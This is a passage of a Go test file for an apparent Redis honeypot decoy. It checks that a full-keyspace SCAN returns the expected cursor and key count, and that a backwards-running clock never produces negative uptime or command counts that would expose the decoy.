	// checked the cursor to decide whether to continue would loop.
	reply := answerOf(t, d, cmd(t, "SCAN", "0", "COUNT", "100"))
	if next, keys := splitScan(t, reply); next != "0" || len(keys) != 8 {
		t.Errorf("a whole-keyspace SCAN returned cursor %q and %d keys", next, len(keys))
	}
}

// A clock that goes backwards. It happens -- a virtual machine resumed from a
// snapshot, an NTP step -- and an uptime reported as a negative number is the
// tell that ends the pretence.
func TestAClockThatGoesBackwardsDoesNotShowThrough(t *testing.T) {
	d := decoyFor(t, &config.RedisDeception{Mode: "decoy"})
	at := time.Date(2025, 3, 5, 14, 0, 0, 0, time.UTC)
	d.started = at
	d.now = func() time.Time { return at.Add(-time.Hour) }
	body := d.info("")
	if got := fieldOf(t, body, "uptime_in_seconds"); strings.HasPrefix(got, "-") {
		t.Errorf("uptime_in_seconds is %q", got)
	}
	if got := fieldOf(t, body, "total_commands_processed"); strings.HasPrefix(got, "-") {
		t.Errorf("total_commands_processed is %q", got)
	}
}
